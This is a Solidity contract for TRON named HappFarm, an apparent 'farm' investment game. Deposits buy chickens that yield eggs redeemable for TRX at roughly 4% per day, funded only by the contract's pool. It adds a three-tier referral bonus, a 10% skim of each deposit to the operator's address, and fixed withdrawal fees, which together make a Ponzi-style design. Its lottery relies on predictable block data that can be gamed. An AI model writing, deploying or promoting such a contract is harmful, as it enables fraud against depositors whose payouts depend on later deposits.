//SourceUnit: HappFarm.sol

pragma solidity >=0.4.23 <0.6.0;

contract HappFarm {
  struct Deposit {
    uint amount;
    uint time;
  }

  struct Farmer {
    bool registered;
    address referer;
    uint referrals_tier1;
    uint referrals_tier2;
    uint referrals_tier3;

    uint balanceRef;
    uint totalRef;

    Deposit[] deposits;

    uint sold;
    uint eggs;
    uint chickens;
    uint balance;
    uint withdrawn;
  }

  uint FEE = 2 trx;
  uint MIN_DEPOSIT = 25 trx;
  address public support = msg.sender;

  uint[] public refRewards;
  uint public totalFarmers;
  uint public totalChicken;
  uint public totalRefRewards;

  mapping (address => Farmer) public farmers;

  event DepositAt(address user, uint amount);
  event DepositShow(uint time);
  event Withdraw(address user, uint amount);
  event IncubateAt(address user, uint amount, uint loop);

  constructor() public {
    refRewards.push(7);
    refRewards.push(2);
    refRewards.push(1);
  }

  function register(address referer) internal {
    if (!farmers[msg.sender].registered) {
      farmers[msg.sender].registered = true;
      totalFarmers++;

      if (farmers[referer].registered && referer != msg.sender) {
        farmers[msg.sender].referer = referer;

        address rec = referer;

        for (uint i = 0; i < refRewards.length; i++) {
          if (!farmers[rec].registered) {
            break;
          }

          if (i == 0) {
            farmers[rec].referrals_tier1++;
          }

          if (i == 1) {
            farmers[rec].referrals_tier2++;
          }

          if (i == 2) {
            farmers[rec].referrals_tier3++;
          }

          rec = farmers[rec].referer;
        }
      }
    }
  }

  function rewardReferers(uint amount, address referer) internal {
    address rec = referer;

    for (uint i = 0; i < refRewards.length; i++) {
      if (!farmers[rec].registered) {
        break;
      }

      uint a = amount * refRewards[i] / 100;

      farmers[rec].balance += a;
      farmers[rec].totalRef += a;
      farmers[rec].balanceRef += a;
      totalRefRewards += a;

      rec = farmers[rec].referer;
    }
  }

  function random(uint rate) private returns (uint) {
    return uint(uint256(keccak256(block.timestamp, block.difficulty)) % rate);
  }

  function deposit(address referer) external payable {
    require(msg.value >= MIN_DEPOSIT);
    Farmer storage farmer = farmers[msg.sender];

    register(referer);

    support.transfer(msg.value / 10);

    rewardReferers(msg.value, farmer.referer);

    uint chickens = msg.value / (25 * 1e6);

    farmer.deposits.push(Deposit({
      amount: chickens,
      time: block.timestamp
    }));

    totalChicken += chickens;
    farmer.chickens += chickens;

    emit DepositAt(msg.sender, chickens);
  }

  function profit(address user) internal returns (uint) {
    Farmer storage farmer = farmers[user];

    uint total = 0;

    for (uint i = 0; i < farmer.deposits.length; i++) {
      Deposit storage dep = farmer.deposits[i];
      if (dep.time > 0) {
        total += dep.amount * (block.timestamp - dep.time) / 86400;
      }
    }

    return total - farmer.sold;
  }

  function egg(address user) public view returns (uint) {
    return profit(user);
  }

  function chicken(address user) public view returns (uint) {
    return farmers[user].chickens;
  }

  function balance(address user) public view returns (uint) {
    return farmers[user].balance;
  }

  function sell(uint value) external payable returns (uint) {
    require(value >= 1);
    require(value <= profit(msg.sender));
    Farmer storage farmer = farmers[msg.sender];

    farmer.sold += value;
    farmer.balance += value * 1e6;

    return value;
  }

  function availabeBalance() public view returns (uint) {
    return address(this).balance;
  }

  function withdraw(uint value) external payable {
    Farmer storage farmer = farmers[msg.sender];
    require(msg.value == FEE, "Withdraw need 2 TRX fee");
    require(farmer.registered, "Can not withdraw because no any investments");

    uint amount = value;

    require(farmer.balance >= amount, "Out of balance");

    if (amount == 0) {
      amount = farmer.balance;
    }

    if (msg.sender.send(amount)) {
      farmer.balance -= amount;
      farmer.withdrawn += amount;
      emit Withdraw(msg.sender, amount);
    }
  }

  function incubate(uint value) external payable returns (uint) {
    Farmer storage farmer = farmers[msg.sender];
    require(msg.value == FEE, "Incubate need 2 TRX fee");
    require(farmer.registered, "Can not incubate because no any investments");

    require(value >= 1);
    require(value <= profit(msg.sender));

    farmer.sold += value;

    uint rate = value > 10000 ? 5 : value > 1000 ? 7 : 10;
    uint number = random(value) + 1;
    uint result = random(rate);
    uint winner = result == 1 ? 1 : 0;
    uint chickens = number * winner;

    if (chickens > 0) {
      farmer.deposits.push(Deposit({
        amount: chickens,
        time: block.timestamp
      }));

      totalChicken += chickens;
      farmer.chickens += chickens;
    }

    support.transfer(2 * 1e6);
    emit IncubateAt(msg.sender, chickens, winner);
  }
}